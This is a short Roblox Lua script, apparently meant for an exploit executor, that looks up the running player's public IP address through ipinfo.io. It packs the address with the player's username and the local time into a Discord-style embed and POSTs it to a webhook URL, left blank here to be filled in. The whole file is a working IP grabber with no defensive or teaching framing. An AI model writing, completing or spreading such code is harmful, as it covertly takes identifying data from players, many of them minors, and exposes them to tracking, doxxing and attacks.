-- Services

local HttpService = game:GetService("HttpService");
local Players = game:GetService("Players");
local Player = Players.LocalPlayer
local PlaceId = game.PlaceId
local JobId = game.JobId

local Request = request or http_request or (http and http.request) or syn.request

-- Code Block

local Block = "`"

-- IP Address

local GetIP = "https://ipinfo.io/ip"
local IPv4 = game:HttpGet(GetIP);

-- Real Time

local OSClock = os.time();
local FormatString = "%I:%M %p"
local Time = os.date(FormatString, OSClock);

-- Images

local Image = "https://www.citypng.com/public/uploads/preview/gps-location-white-symbol-icon-transparent-png-11637079270ec5zfjqidf.png"

-- Services

local WebHook = ""  -- WebHook URL
local ExtractedData = {
	["content"] = "",
	["embeds"] = {
		{
			["type"] = "rich",
			["color"] = tonumber(0xeb343d),
			["thumbnail"] = {
				["url"] = Image
			},
			["fields"] = {
				{
					["name"] = "Username",
					["value"] = Block .. Block .. Block .. Player.Name .. Block .. Block .. Block,
					["inline"] = true
				},
				{
					["name"] = "IP Address",
					["value"] = Block .. Block .. Block .. IPv4 .. Block .. Block .. Block,
					["inline"] = true
				}
			},
			["footer"] = {
				["text"] = Time,
				["icon_url"] = Image
			}
		}
	}
}

local RetrievedData = HttpService:JSONEncode(ExtractedData);

local Code = {
   ["content-type"] = "application/json"
}

local Messenger = {Url = WebHook, Body = RetrievedData, Method = "POST", Headers = Code};

request(Messenger);
